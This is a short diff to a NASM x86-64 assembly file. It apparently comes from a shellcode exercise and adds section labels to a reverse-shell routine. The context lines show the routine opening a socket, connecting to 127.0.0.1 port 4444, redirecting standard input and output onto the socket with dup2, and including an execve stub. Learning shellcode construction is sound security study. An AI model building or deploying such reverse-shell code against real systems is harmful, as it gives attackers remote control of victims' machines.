@@ -2,7 +2,7 @@ global _start
 
 %define _START
 _start:
-
+socket:
     ; sock = socket(AF_INET, SOCK_STREAM, 0)
     ; AF_INET = 2
     ; SOCK_STREAM = 1
@@ -16,6 +16,7 @@ _start:
 
     mov rdi, rax
 
+connect:
     ; server.sin_family = AF_INET;    short
     ; server.sin_port = htons(4444);    unsigned short
     ; server.sin_addr.s_addr = inet_addr("127.0.0.1");    unsigned long
@@ -46,6 +47,7 @@ _start:
     mov rdx, 16  ; sizeof(sockaddr_in)
     syscall
 
+dup2:
     ; dup2(sock, 0);
     ; dup2(sock, 1);
     ; dup2(sock, 2);
@@ -63,4 +65,5 @@ _start:
     inc rsi
     syscall
 
+execve:
     %include "execve-stack.nasm"
